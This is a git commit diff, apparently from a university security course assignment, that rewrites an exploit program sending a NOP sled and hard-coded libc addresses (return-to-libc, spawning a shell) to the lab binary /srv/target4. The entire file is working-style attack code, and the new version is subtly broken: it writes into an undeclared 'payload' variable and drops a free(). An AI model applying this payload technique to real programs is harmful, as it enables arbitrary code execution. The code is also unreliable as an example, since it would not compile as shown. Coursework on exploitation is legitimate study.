2c85b80190725a2710a68818f26da502078a582a
justinhalford <justinhalford@gmail.com>
2024-05-10 20:56:27 -0400

    may 7

--- cs5435-hw4/sploits/sploit4.c
+++ cs5435-hw4/sploits/sploit4.c
@@ -5,29 +5,23 @@
 #include "shellcode.h"
 
 const char* TARGET = "/srv/target4";
-const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
-const char* SYS = "\x60\x43\xe1\xf7";
-const char* EX = "\xc0\x6e\xe0\xf7";
-const char* SH = "\x63\xf3\xf5\xf7";
 
-char* create_exploit_payload() {
-    char* payload = malloc(strlen(SLED) + strlen(SYS) + strlen(EX) + strlen(SH) + 1);
-    if (!payload) {
-        perror("Failed to allocate payload");
-        exit(EXIT_FAILURE);
-    }
-    sprintf(payload, "%s%s%s%s", SLED, SYS, EX, SH);
-    return payload;
+const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
+const char* ADD = "\x60\x43\xe1\xf7\xc0\x6e\xe0\xf7\x63\xf3\xf5\xf7";
+
+char* prep() {
+    char* buf = malloc(strlen(SLED) + strlen(ADD) + 1);
+    sprintf(payload, "%s%s", SLED, ADD);
+    return buf;
 }
 
 int main() {
-    char *args[3] = {(char*)TARGET, create_exploit_payload(), NULL};
+    char *args[3] = {(char*)TARGET, prep(), NULL};
     char *env[1] = {NULL};
 
     if (execve(TARGET, args, env) == -1) {
         perror("execve failed");
     }
 
-    free(args[1]);
     return 0;
 }
